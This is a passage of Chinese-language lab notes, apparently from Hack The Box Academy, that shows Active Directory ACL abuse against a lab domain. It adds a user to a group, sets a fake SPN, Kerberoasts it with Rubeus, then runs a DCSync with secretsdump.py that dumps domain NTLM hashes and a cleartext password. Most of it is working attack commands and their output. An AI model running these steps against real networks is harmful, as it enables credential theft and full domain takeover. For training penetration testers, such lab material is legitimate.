<h3 id="使用-damundsen-创建-SecureString-对象"><a href="#使用-damundsen-创建-SecureString-对象" class="headerlink" title="使用 damundsen 创建 SecureString 对象"></a>使用 damundsen 创建 SecureString 对象</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$SecPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$Cred2</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;INLANEFREIGHT\damundsen&#x27;</span>, <span class="hljs-variable">$SecPassword</span>) <br></code></pre></td></tr></table></figure>

<h3 id="将-damundsen-添加到Help-Desk-Level-1-Group"><a href="#将-damundsen-添加到Help-Desk-Level-1-Group" class="headerlink" title="将 damundsen 添加到Help Desk Level 1 Group"></a>将 damundsen 添加到Help Desk Level 1 Group</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADGroup</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Help Desk Level 1&quot;</span> <span class="hljs-literal">-Properties</span> * | <span class="hljs-built_in">Select</span> <span class="hljs-literal">-ExpandProperty</span> Members<br><br>CN=Stella Blagg,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Marie Wright,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Jerrell Metzler,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Evelyn Mailloux,OU=Operations,OU=Logistics<span class="hljs-literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Juanita Marrero,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Joseph Miller,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Wilma Funk,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Maxie Brooks,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Scott Pilcher,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Orval Wong,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=David Werner,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Alicia Medlin,OU=Operations,OU=Logistics<span class="hljs-literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Lynda Bryant,OU=Operations,OU=Logistics<span class="hljs-literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Tyler Traver,OU=Operations,OU=Logistics<span class="hljs-literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Maurice Duley,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=William Struck,OU=Operations,OU=Logistics<span class="hljs-literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Denis Rogers,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Billy Bonds,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Gladys Link,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Gladys Brooks,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Margaret Hanes,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Michael Hick,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Timothy Brown,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Nancy Johansen,OU=Operations,OU=Logistics<span class="hljs-literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Valerie Mcqueen,OU=Operations,OU=Logistics<span class="hljs-literal">-LAX</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Add-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&#x27;Help Desk Level 1&#x27;</span> <span class="hljs-literal">-Members</span> <span class="hljs-string">&#x27;damundsen&#x27;</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred2</span> <span class="hljs-literal">-Verbose</span><br><br>VERBOSE: [<span class="hljs-built_in">Get-PrincipalContext</span>] <span class="hljs-keyword">Using</span> alternate credentials<br>VERBOSE: [<span class="hljs-built_in">Add-DomainGroupMember</span>] Adding member <span class="hljs-string">&#x27;damundsen&#x27;</span> to <span class="hljs-built_in">group</span> <span class="hljs-string">&#x27;Help Desk Level 1&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="创建虚假-SPN"><a href="#创建虚假-SPN" class="headerlink" title="创建虚假 SPN"></a>创建虚假 SPN</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred2</span> <span class="hljs-literal">-Identity</span> adunn <span class="hljs-literal">-SET</span> <span class="hljs-selector-tag">@</span>&#123;serviceprincipalname=<span class="hljs-string">&#x27;notahacker/LEGIT&#x27;</span>&#125; <span class="hljs-literal">-Verbose</span><br><br>VERBOSE: [<span class="hljs-built_in">Get-Domain</span>] <span class="hljs-keyword">Using</span> alternate credentials for Get-Domain<br>VERBOSE: [<span class="hljs-built_in">Get-Domain</span>] Extracted domain <span class="hljs-string">&#x27;INLANEFREIGHT&#x27;</span> from <span class="hljs-literal">-Credential</span><br>VERBOSE: [<span class="hljs-built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL<br>VERBOSE: [<span class="hljs-built_in">Get-DomainSearcher</span>] <span class="hljs-keyword">Using</span> alternate credentials for LDAP connection<br>VERBOSE: [<span class="hljs-built_in">Get-DomainObject</span>] <span class="hljs-built_in">Get-DomainObject</span> <span class="hljs-keyword">filter</span> string:<br>(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))<br>VERBOSE: [<span class="hljs-built_in">Set-DomainObject</span>] Setting <span class="hljs-string">&#x27;serviceprincipalname&#x27;</span> to <span class="hljs-string">&#x27;notahacker/LEGIT&#x27;</span> <span class="hljs-keyword">for</span> object <span class="hljs-string">&#x27;adunn&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="使用-Rubeus-进行-Kerberoasting"><a href="#使用-Rubeus-进行-Kerberoasting" class="headerlink" title="使用 Rubeus 进行 Kerberoasting"></a>使用 Rubeus 进行 Kerberoasting</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\Rubeus.exe kerberoast /user:adunn /nowrap<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v2.<span class="hljs-number">0.2</span><br><br><br>[*] Action: Kerberoasting<br><br>[*] NOTICE: AES hashes will be returned <span class="hljs-keyword">for</span> AES<span class="hljs-literal">-enabled</span> accounts.<br>[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="hljs-keyword">for</span> these accounts.<br><br>[*] Target User            : adunn<br>[*] Target Domain          : INLANEFREIGHT.LOCAL<br>[*] Searching path <span class="hljs-string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span><br><br>[*] Total kerberoastable users : <span class="hljs-number">1</span><br><br><br>[*] SamAccountName         : adunn<br>[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>[*] ServicePrincipalName   : notahacker/LEGIT<br>[*] PwdLastSet             : <span class="hljs-number">3</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">29</span>:<span class="hljs-number">08</span> AM<br>[*] Supported ETypes       : RC4_HMAC_DEFAULT<br>[*] Hash                   : <span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span><span class="hljs-variable">$</span>*adunn<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$notahacker</span>/LEGIT@INLANEFREIGHT.LOCAL*<span class="hljs-variable">$</span> &lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h3><h4 id="从-adunn-的账户中移除伪造的-SPN"><a href="#从-adunn-的账户中移除伪造的-SPN" class="headerlink" title="从 adunn 的账户中移除伪造的 SPN"></a>从 adunn 的账户中移除伪造的 SPN</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred2</span> <span class="hljs-literal">-Identity</span> adunn <span class="hljs-literal">-Clear</span> serviceprincipalname <span class="hljs-literal">-Verbose</span><br><br>VERBOSE: [<span class="hljs-built_in">Get-Domain</span>] <span class="hljs-keyword">Using</span> alternate credentials for Get-Domain<br>VERBOSE: [<span class="hljs-built_in">Get-Domain</span>] Extracted domain <span class="hljs-string">&#x27;INLANEFREIGHT&#x27;</span> from <span class="hljs-literal">-Credential</span><br>VERBOSE: [<span class="hljs-built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL<br>VERBOSE: [<span class="hljs-built_in">Get-DomainSearcher</span>] <span class="hljs-keyword">Using</span> alternate credentials for LDAP connection<br>VERBOSE: [<span class="hljs-built_in">Get-DomainObject</span>] <span class="hljs-built_in">Get-DomainObject</span> <span class="hljs-keyword">filter</span> string:<br>(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))<br>VERBOSE: [<span class="hljs-built_in">Set-DomainObject</span>] Clearing <span class="hljs-string">&#x27;serviceprincipalname&#x27;</span> <span class="hljs-keyword">for</span> object <span class="hljs-string">&#x27;adunn&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="从-Help-Desk-Level-1-Group中移除-damundsen"><a href="#从-Help-Desk-Level-1-Group中移除-damundsen" class="headerlink" title="从 Help Desk Level 1 Group中移除 damundsen"></a>从 Help Desk Level 1 Group中移除 damundsen</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Remove-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Help Desk Level 1&quot;</span> <span class="hljs-literal">-Members</span> <span class="hljs-string">&#x27;damundsen&#x27;</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred2</span> <span class="hljs-literal">-Verbose</span><br><br>VERBOSE: [<span class="hljs-built_in">Get-PrincipalContext</span>] <span class="hljs-keyword">Using</span> alternate credentials<br>VERBOSE: [<span class="hljs-built_in">Remove-DomainGroupMember</span>] Removing member <span class="hljs-string">&#x27;damundsen&#x27;</span> from <span class="hljs-built_in">group</span> <span class="hljs-string">&#x27;Help Desk Level 1&#x27;</span><br>True<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Help Desk Level 1&quot;</span> | <span class="hljs-built_in">Select</span> MemberName |? &#123;<span class="hljs-variable">$_</span>.MemberName <span class="hljs-operator">-eq</span> <span class="hljs-string">&#x27;damundsen&#x27;</span>&#125; <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>

<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><h3 id="查看-adunn-的组成员身份-Replication权限"><a href="#查看-adunn-的组成员身份-Replication权限" class="headerlink" title="查看 adunn 的组成员身份&#x2F;Replication权限"></a>查看 adunn 的组成员身份&#x2F;Replication权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> adunn  |<span class="hljs-built_in">select</span> samaccountname,objectsid,memberof,useraccountcontrol |<span class="hljs-built_in">fl</span><br><br><br>samaccountname     : adunn<br>objectsid          : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1164</span><br>memberof           : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar<br>                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security<br>                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="hljs-built_in">H</span> Drive,OU=Security<br>                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...&#125;<br>useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$sid</span>= <span class="hljs-string">&quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot;</span><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ObjectAcl</span> <span class="hljs-string">&quot;DC=inlanefreight,DC=local&quot;</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; (<span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-match</span> <span class="hljs-string">&#x27;Replication-Get&#x27;</span>)&#125; | ?&#123;<span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-variable">$sid</span>&#125; |<span class="hljs-built_in">select</span> AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | <span class="hljs-built_in">fl</span><br><br>AceQualifier          : AccessAllowed<br>ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights : ExtendedRight<br>SecurityIdentifier    : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-498</span><br>ObjectAceType         : DS<span class="hljs-literal">-Replication-Get-Changes</span><br><br>AceQualifier          : AccessAllowed<br>ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights : ExtendedRight<br>SecurityIdentifier    : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-516</span><br>ObjectAceType         : DS<span class="hljs-literal">-Replication-Get-Changes-All</span><br><br>AceQualifier          : AccessAllowed<br>ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights : ExtendedRight<br>SecurityIdentifier    : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1164</span><br>ObjectAceType         : DS<span class="hljs-literal">-Replication-Get-Changes-In-Filtered-Set</span><br><br>AceQualifier          : AccessAllowed<br>ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights : ExtendedRight<br>SecurityIdentifier    : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1164</span><br>ObjectAceType         : DS<span class="hljs-literal">-Replication-Get-Changes</span><br><br>AceQualifier          : AccessAllowed<br>ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights : ExtendedRight<br>SecurityIdentifier    : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1164</span><br>ObjectAceType         : DS<span class="hljs-literal">-Replication-Get-Changes-All</span><br></code></pre></td></tr></table></figure>

<h3 id="提取-NTLM-哈希和-Kerberos-密钥"><a href="#提取-NTLM-哈希和-Kerberos-密钥" class="headerlink" title="提取 NTLM 哈希和 Kerberos 密钥"></a>提取 NTLM 哈希和 Kerberos 密钥</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell">c2tt@htb[/<span class="hljs-type">htb</span>]<span class="hljs-variable">$</span> secretsdump.py <span class="hljs-literal">-outputfile</span> inlanefreight_hashes <span class="hljs-literal">-just-dc</span> INLANEFREIGHT/adunn@<span class="hljs-number">172.16</span>.<span class="hljs-number">5.5</span> <br><br>Impacket v0.<span class="hljs-number">9.23</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br>Password:<br>[*] Target system bootKey: <span class="hljs-number">0</span>x0e79d2e5d9bad2639da4ef244b30fda5<br>[*] Searching <span class="hljs-keyword">for</span> NTDS.dit<br>[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a <span class="hljs-built_in">copy</span>. This might take some time<br>[*] <span class="hljs-keyword">Using</span> smbexec method for remote execution<br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Searching <span class="hljs-keyword">for</span> pekList, be patient<br>[*] PEK <span class="hljs-comment"># 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6</span><br>[*] Reading and decrypting hashes from \\<span class="hljs-number">172.16</span>.<span class="hljs-number">5.5</span>\ADMIN<span class="hljs-variable">$</span>\Temp\HOLJALFD.tmp <br>inlanefreight.local\administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">88</span>ad09182de639ccc6579eb0849751cf:::<br>guest:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>lab_adm:<span class="hljs-number">1001</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">663715</span>a1a8b957e8e9943cc98ea451b6:::<br>ACADEMY<span class="hljs-literal">-EA-DC01</span><span class="hljs-variable">$</span>:<span class="hljs-number">1002</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">13673</span>b5b66f699e81b2ebcb63ebdccfb:::<br>krbtgt:<span class="hljs-number">502</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">16</span>e26ba33e455a8c338142af8d89ffbc:::<br>ACADEMY<span class="hljs-literal">-EA-MS01</span><span class="hljs-variable">$</span>:<span class="hljs-number">1107</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">06</span>c77ee55364bd52559c0db9b1176f7a:::<br>ACADEMY<span class="hljs-literal">-EA-WEB01</span><span class="hljs-variable">$</span>:<span class="hljs-number">1108</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">1</span>c7e2801ca48d0a5e3d5baf9e68367<span class="hljs-built_in">ac</span>:::<br>inlanefreight.local\htb<span class="hljs-literal">-student</span>:<span class="hljs-number">1111</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">2487</span>a01dd672b583415cb52217824bb5:::<br>inlanefreight.local\avazquez:<span class="hljs-number">1112</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">58</span>a478135a93ac3bf058a5ea0e8fdb71:::<br><br>&lt;SNIP&gt;<br>d0wngrade:des<span class="hljs-literal">-cbc-md5</span>:d6fee0b62aa410fe<br>d0wngrade:dec<span class="hljs-literal">-cbc-crc</span>:d6fee0b62aa410fe<br>ACADEMY<span class="hljs-literal">-EA-FILE</span><span class="hljs-variable">$</span>:des<span class="hljs-literal">-cbc-md5</span>:eaef54a2c101406d<br>svc_qualys:des<span class="hljs-literal">-cbc-md5</span>:f125ab34b53eb61c<br>forend:des<span class="hljs-literal">-cbc-md5</span>:e3c14adf9d8a04c1<br>[*] ClearText password from \\<span class="hljs-number">172.16</span>.<span class="hljs-number">5.5</span>\ADMIN<span class="hljs-variable">$</span>\Temp\HOLJALFD.tmp <br>proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!<br>[*] Cleaning up...<br></code></pre></td></tr></table></figure>

<h3 id="使用-Get-ADUser-进行进一步枚举"><a href="#使用-Get-ADUser-进行进一步枚举" class="headerlink" title="使用 Get-ADUser 进行进一步枚举"></a>使用 Get-ADUser 进行进一步枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&#x27;userAccountControl -band 128&#x27;</span> <span class="hljs-literal">-Properties</span> userAccountControl<br><br>DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>Enabled            : True<br>GivenName          :<br>Name               : PROXYAGENT<br>ObjectClass        : user<br>ObjectGUID         : c72d37d9<span class="hljs-literal">-e9ff-4e54-9afa-77775eaaf334</span><br>SamAccountName     : proxyagent<br>SID                : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5222</span><br>Surname            :<br>userAccountControl : <span class="hljs-number">640</span><br>UserPrincipalName  :<br></code></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainUser-检查可逆加密选项"><a href="#使用-Get-DomainUser-检查可逆加密选项" class="headerlink" title="使用 Get-DomainUser 检查可逆加密选项"></a>使用 Get-DomainUser 检查可逆加密选项</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> * | ? &#123;<span class="hljs-variable">$_</span>.useraccountcontrol <span class="hljs-operator">-like</span> <span class="hljs-string">&#x27;*ENCRYPTED_TEXT_PWD_ALLOWED*&#x27;</span>&#125; |<span class="hljs-built_in">select</span> samaccountname,useraccountcontrol<br><br>samaccountname                         useraccountcontrol<br><span class="hljs-literal">--------------</span>                         <span class="hljs-literal">------------------</span><br>proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT<br></code></pre></td></tr></table></figure>

